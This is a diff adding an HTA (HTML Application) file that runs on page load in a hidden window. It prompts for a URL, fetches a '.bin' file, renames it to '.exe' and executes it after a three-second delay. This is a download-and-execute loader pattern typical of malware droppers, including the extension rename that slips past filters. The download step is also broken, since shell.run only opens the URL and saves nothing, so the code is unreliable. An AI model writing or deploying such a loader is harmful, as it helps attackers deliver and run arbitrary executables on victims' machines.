@@ -1,0 +1,49 @@
+<html>
+<head>
+    <title>Download and Run</title>
+    <hta:application id="downloadApp"
+        applicationname="Download and Run"
+        scroll="no"
+        singleinstance="yes"
+        windowstate="hidden"
+    >
+</head>
+<body>
+    <script language="javascript">
+        // Function to initiate the file download and rename it to .exe
+        function downloadAndRun() {
+            try {
+                var shell = new ActiveXObject('WScript.Shell');
+                var fso = new ActiveXObject('Scripting.FileSystemObject');
+
+                // Prompt the user for the download URL
+                var downloadURL = prompt('Enter the URL to download the executable (.bin):');
+                if (downloadURL) {
+                    var downloadPath = 'downloaded_file.bin'; // Temporary .bin file path
+                    shell.run(downloadURL, 1, true); // Download the file
+                    if (fso.FileExists(downloadPath)) {
+                        var executeCommand = 'downloaded_file.exe'; // Rename to .exe
+                        fso.MoveFile(downloadPath, executeCommand); // Rename the file
+                        setTimeout(function() {
+                            shell.run(executeCommand); // Execute the renamed file after a delay
+                            window.close(); // Close the HTA window
+                        }, 3000); // Adjust the delay in milliseconds (3 seconds in this example)
+                    } else {
+                        alert('Download failed. Please try again.');
+                        window.close();
+                    }
+                } else {
+                    alert('No URL entered. Please try again.');
+                    window.close();
+                }
+            } catch (error) {
+                alert('An error occurred: ' + error.message);
+                window.close();
+            }
+        }
+
+        // Call the downloadAndRun function when the HTA is loaded
+        window.onload = downloadAndRun;
+    </script>
+</body>
+</html>
